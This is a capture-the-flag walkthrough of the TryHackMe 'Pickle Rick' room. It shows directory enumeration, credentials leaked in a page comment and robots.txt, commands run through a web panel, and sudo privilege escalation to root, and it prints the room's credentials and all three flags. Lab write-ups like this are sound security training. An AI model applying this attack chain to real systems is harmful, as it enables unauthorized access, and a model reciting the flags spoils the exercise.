# Pickle Rick

## [Pickle Rick on TryHackMe](https://tryhackme.com/room/picklerick)

## Overview

* **Difficulty:** Easy
* **Category:** CTF / Privilege Escalation
* **Skills Practiced:**

	* Web enumeration (HTML comments, robots.txt, gobuster)
	* Credential discovery & login
	* Command execution via restricted web panel
	* File system traversal & privilege escalation

## Tools & Techniques

* **Gobuster** → directory brute force
* **robots.txt** → sensitive info disclosure
* **Inspect Source** → discover hidden comments
* **Command Panel** → web shell for command execution
* **Sudo Privilege Escalation** → root access

## Walkthrough (Step-by-Step)

### 1. Inspect Page Source

**Action:** Inspect `index.html` source.
**Output:**

```html
<!--
	Note to self, remember username!
	Username: R1ckRul3s
-->
```

Found **username**: `R1ckRul3s`

### 2. Gobuster Directory Enumeration

```bash
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**Output (important entries):**

```
/assets               (Status: 301) [--> http://<ip>/assets/]
/denied.php           (Status: 302) [--> /login.php]
/index.html           (Status: 200)
/login.php            (Status: 200)
/portal.php           (Status: 302) [--> /login.php]
/robots.txt           (Status: 200)
```

Found potential login page (`/login.php`) and `/robots.txt`.

### 3. Check robots.txt

**URL:** `http://<ip>/robots.txt`
**Output:**

```
Wubbalubbadubdub
```

Found **password**: `Wubbalubbadubdub`

### 4. Login Panel

**Page:** `http://<ip>/login.php`
**Credentials:**

* Username: `R1ckRul3s`
* Password: `Wubbalubbadubdub`

Successful login → Access to **Command Panel**.

### 5. List Files in Web Directory

**Command:**

```
ls
```

**Output:**

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Found interesting files: `Sup3rS3cretPickl3Ingred.txt` and `clue.txt`.

### 6. Read First Ingredient

**Command:**

```
cat Sup3rS3cretPickl3Ingred.txt
```

**Output:**

```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

Try with `less`:

```
less Sup3rS3cretPickl3Ingred.txt
```

**Output:**

```
mr. meeseek hair
```

**First Ingredient:** `mr. meeseek hair`

### 7. Check Clue

**Command:**

```
less clue.txt
```

**Output:**

```
Look around the file system for the other ingredient.
```

Hint: Explore filesystem for more ingredients.

### 8. Explore /home Directory

**Command:**

```
ls /home
```

**Output:**

```
rick
ubuntu
```

**Command:**

```
ls -l /home/rick
```

**Output:**

```
-rwxrwxrwx 1 root root 13 Feb 10  2019 second ingredients
```

**Command:**

```
less /home/rick/second\ ingredients
```

**Output:**

```
1 jerry tear
```

**Second Ingredient:** `1 jerry tear`

### 9. Check Sudo Privileges

**Command:**

```
sudo -l
```

**Output:**

```
User www-data may run the following commands on ip-10-201-89-76:
    (ALL) NOPASSWD: ALL
```

`www-data` can run **any command as root** without a password.

### 10. Access Root Directory

**Command:**

```
sudo ls -l /root
```

**Output:**

```
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
```

**Command:**

```
sudo less /root/3rd.txt
```

**Output:**

```
3rd ingredients: fleeb juice
```

**Third Ingredient:** `fleeb juice`
